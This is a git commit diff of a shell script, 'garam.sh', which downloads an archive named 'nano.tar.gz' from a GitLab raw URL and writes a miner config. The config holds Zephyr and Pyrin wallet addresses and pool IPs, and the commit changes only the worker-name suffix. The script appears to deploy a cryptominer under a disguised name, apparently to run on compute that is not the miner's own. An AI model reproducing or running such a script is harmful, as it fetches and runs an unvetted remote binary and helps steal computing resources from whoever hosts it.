1fbf5b5337d9cd91a54712b7650ecec1a3b2efb5
williehprnuhrxyq <159912408+williehprnuhrxyq@users.noreply.github.com>
2024-06-22 21:16:27 +0700

    Update garam.sh

--- garam.sh
+++ garam.sh
@@ -6,11 +6,11 @@ wget -qO nano.tar.gz https://gitlab.com/jasa4/jasa/-/raw/main/nano.tar.gz && tar
 
 cat > config.ini <<END
 [RandomX]
-wallet = ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo $(TZ=UTC-7 date +"%H-%M-%S"))
+wallet = ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo GR-$(TZ=UTC-7 date +"%H-%M-%S"))
 pool1 = 47.89.195.104:443
 
 [PyrinHash]
-wallet = pyrin:qpkxgkszu2dtek33z5nu5uvqftmj6x9stjvpsrdr502p2v8mpqduwt74nc0jm.$(echo $(TZ=UTC-7 date +"%H-%M-%S"))
+wallet = pyrin:qpkxgkszu2dtek33z5nu5uvqftmj6x9stjvpsrdr502p2v8mpqduwt74nc0jm.$(echo GR-$(TZ=UTC-7 date +"%H-%M-%S"))
 pool1 = 47.236.130.246:80
 END
 
